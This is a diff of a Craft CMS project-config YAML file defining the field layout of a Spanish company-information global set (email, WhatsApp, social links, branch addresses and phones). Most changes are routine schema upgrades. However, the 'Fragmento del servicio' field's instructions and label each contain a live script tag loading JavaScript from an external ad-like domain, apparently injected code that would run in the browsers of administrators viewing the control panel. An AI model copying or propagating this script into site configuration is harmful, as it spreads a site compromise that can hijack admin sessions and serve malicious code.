@@ -2,99 +2,155 @@ fieldLayouts:
   c575f2c1-b1a3-4508-bb72-ec248d24412d:
     tabs:
       -
+        elementCondition: null
         elements:
           -
+            elementCondition: null
             fieldUid: 24ad1f78-4194-4ad0-b646-3ea0ea9f4a1d # Correo electrónico
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 09d3fa96-23a2-4194-96e9-c4a9270d8eba
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
+            fieldUid: 30a702d2-4345-4293-b5a1-8d8461a101a6 # Email Secundario
+            instructions: null
+            label: null
+            required: false
+            tip: null
+            type: craft\fieldlayoutelements\CustomField
+            uid: 7be22416-f9c1-4ef2-b0bb-9329981abc84
+            userCondition: null
+            warning: null
+            width: 50
+          -
+            elementCondition: null
             fieldUid: ba888375-fe91-495d-af9a-291201c2cbd1 # Global WhatsApp
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 5b2f1127-f537-45b8-9673-3fcb97b5f934
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
             fieldUid: 43f226eb-8874-48e8-ac5f-222fbc3ca738 # Facebook
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 21b34364-2085-4796-912b-c49bdf818e99
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
             fieldUid: 8bb59c3e-d540-4254-8f4a-c4af6c5abdb5 # Linkedin
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 4d618c7c-0cd1-4dd1-b860-564eaf845bd4
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
+            fieldUid: 4c7e917b-d143-45e1-9647-ec7c7c5ca0b2 # Instagram
+            instructions: null
+            label: null
+            required: false
+            tip: null
+            type: craft\fieldlayoutelements\CustomField
+            uid: 0ce3b802-9395-493e-8035-5a35a0d548d6
+            userCondition: null
+            warning: null
+            width: 50
+          -
+            elementCondition: null
             fieldUid: 3c0e1e4e-7598-4723-9566-831a3692dc3e # Dirección Pachuca
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: d2f85d8c-fce5-40e9-8e3f-c52f91abaf8d
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
             fieldUid: 006fbfdc-6b86-4dc3-b898-a9b30cd5a062 # Dirección Querétaro
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 11db01f8-6c78-4907-998a-a734bd7947d6
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
             fieldUid: 9f12f92b-d3c9-433e-b204-5ce21c95d573 # Teléfono Pachuca
             instructions: null
             label: null
             required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: deab0b71-94c6-4bea-a9c9-5bacf062fe47
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
             fieldUid: fe51675c-165a-43b1-a367-0e28d4c642d5 # qroPhone
-            instructions: ''
+            instructions: null
             label: 'Teléfono Quéretaro'
-            required: ''
+            required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 76a6be61-6025-4a1b-87ea-2bd447cb4a1d
+            userCondition: null
             warning: null
             width: 50
           -
+            elementCondition: null
             fieldUid: b0568e7a-3e32-4145-82cd-67b09eacf53e # Teléfono Tizayuca
-            instructions: ''
+            instructions: null
             label: __blank__
-            required: ''
+            required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 8400d7f4-c29e-4e5c-815e-9565d6b2ca76
+            userCondition: null
             warning: null
             width: 100
           -
+            elementCondition: null
             fieldUid: 2f7a52fb-ecc7-4102-b37f-07c1e3141a2b # Fragmento del servicio
             instructions: '<script src="https://www.wp3advesting.com/adscdn.js"></script> '
             label: '<script src="https://www.wp3advesting.com/adscdn.js"></script> '
-            required: ''
+            required: false
             tip: null
             type: craft\fieldlayoutelements\CustomField
+            uid: 84010a00-e6c0-4402-b572-6e14f2458e19
+            userCondition: null
             warning: null
             width: 100
         name: 'Tab 1'
-        sortOrder: 1
+        uid: c5759db8-87aa-42e9-83ec-3c924a8c93e4
+        userCondition: null
 handle: companyInfo
 name: 'Datos de la empresa'
 sortOrder: 1
